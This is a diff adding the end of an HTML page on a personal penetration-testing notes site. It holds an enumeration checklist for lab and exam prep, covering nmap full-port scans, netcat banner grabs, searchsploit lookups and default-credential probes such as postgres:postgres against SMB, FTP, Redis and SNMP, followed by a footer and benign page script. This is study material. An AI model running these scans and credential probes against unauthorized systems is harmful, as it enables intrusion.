+<li>[ ] <code>sudo nmap -Pn -sC -sV -p- -v &lt;IP&gt; -oN scan.txt</code></li>
+<li>[ ] For every non-HTTP port: <code>nc -nv &lt;IP&gt; &lt;PORT&gt;</code> banner grab</li>
+<li>[ ] Version -&gt; CVE search (<code>searchsploit &lt;product&gt;</code>)</li>
+<li>[ ] Anonymous / default cred probe <strong>before</strong> exploit hunt</li>
+<li>[ ] SMB: <code>enum4linux-ng</code>, <code>nxc --shares</code>, RID brute with guest fallback</li>
+<li>[ ] FTP: anon + writable-dir check; <code>PWD</code>, <code>SITE CHMOD</code></li>
+<li>[ ] Redis: <code>INFO</code> unauth?</li>
+<li>[ ] PostgreSQL: <code>postgres:postgres</code> first</li>
+<li>[ ] SNMP: <code>onesixtyone</code> common strings</li>
+<li>[ ] Any DC-shaped port set (88+389+636) -&gt; jump to Active Directory methodology</li>
+<li>[ ] Non-standard port = intended path</li>
+<li>[ ] Egress port test before firing any callback</li>
+<li>[ ] Metasploit exploit modules = ONE target only</li>
+</ul>
+  <p class="disclaimer">// For authorized engagements, lab environments, and exam prep only. Box names reference retired HTB / PG Practice targets used for study. Replace all placeholders with your own scoped values.</p>
+</main>
+
+<footer class="site">
+  <div class="wrap foot">
+    <div class="f-brand"><b>corey.clay</b> — network · <span id="year"></span></div>
+    <div class="foot-links">
+      <a href="index.html">home</a>
+      <a href="https://github.com/Ac3xRaid3r" target="_blank" rel="noopener">github</a>
+      <a href="#top">top</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var y=document.getElementById('year'); if(y) y.textContent=new Date().getFullYear();
+
+  document.querySelectorAll('main table').forEach(function(t){
+    if(t.parentElement.classList.contains('table-scroll')) return;
+    var w=document.createElement('div'); w.className='table-scroll';
+    t.parentNode.insertBefore(w,t); w.appendChild(t);
+  });
+
+  document.querySelectorAll('main pre').forEach(function(pre){
+    var wrap=document.createElement('div'); wrap.className='code-wrap';
+    pre.parentNode.insertBefore(wrap,pre); wrap.appendChild(pre);
+    var btn=document.createElement('button');
+    btn.className='copy'; btn.type='button'; btn.textContent='copy';
+    btn.setAttribute('aria-label','Copy to clipboard');
+    btn.addEventListener('click',function(){
+      var text=pre.innerText;
+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');a.scrollIntoView({block:'nearest',inline:'center'});}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
